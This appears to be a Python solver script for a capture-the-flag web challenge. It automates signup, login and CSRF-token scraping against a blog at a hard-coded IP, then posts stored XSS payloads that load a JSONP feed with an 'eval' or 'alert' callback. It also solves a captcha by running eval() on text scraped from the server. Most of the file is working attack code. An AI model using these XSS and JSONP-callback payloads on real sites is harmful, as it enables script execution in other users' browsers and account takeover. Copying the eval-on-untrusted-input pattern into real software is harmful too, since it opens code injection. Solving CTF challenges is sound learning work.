import requests
from saker.main import Saker


class Blog(Saker):

    def __init__(self, url=""):
        super(Blog, self).__init__(url)

    def getToken(self):
        target = "csrfmiddlewaretoken' value='"
        index = self.lastr.content.find(target) + len(target)
        return self.lastr.content[index:].split("'")[0]

    def signup(self, name, pwd="123asdzxc"):
        self.get("signup/")
        data = {
            "username": name,
            "password1": pwd,
            "password2": pwd,
            "csrfmiddlewaretoken": self.getToken(),
        }
        self.post("signup/", data=data)
        # print(self.lastr.content)

    def login(self, name, pwd="123asdzxc"):
        self.get("login/")
        data = {
            "username": name,
            "password": pwd,
            "csrfmiddlewaretoken": self.getToken(),
        }
        self.post("login/", data=data)
        # print(self.lastr.content)

    def publish(self, title, content):
        self.get()
        captcha = eval(self.lastr.content.split("What is ")[1].split("?")[0])
        data = {
            "title": title,
            "post": content,
            "captcha_answer": captcha,
            "csrfmiddlewaretoken": self.getToken(),
        }
        self.post("publish", data=data)

    def feed(self, ftype="json", callback=""):
        params = {
            "type": ftype,
            "cb": callback,
        }
        self.get("feed", params=params)
        print(self.lastr.content)

    def flag1(self):
        self.get("flag1")

    def flagapi(self):
        self.get()
        captcha = eval(self.lastr.content.split("What is ")[1].split("?")[0])
        data = {
            "captcha_answer": captcha,
        }
        self.post("flagapi", data=data)

if __name__ == '__main__':
    b = Blog("http://35.197.245.102/")
    username = "lyle4"
    b.signup(username)
    b.login(username)
    b.flagapi()
    exit()
    # 访问flag1
    # 获取页面
    # 转发
    b.feed("jsonp", "alert")
    b.signup(username)
    b.login(username)
    b.publish("title", '"+2+"')
    b.publish("test", "<script src='/feed?type=jsonp&cb=eval'></script>")
    b.feed("jsonp", "eval")
    b.publish("lyel2", "<script src='/feed?type=jsonp&cb=alert'></script>")
    b.feed("jsonp", "alert")
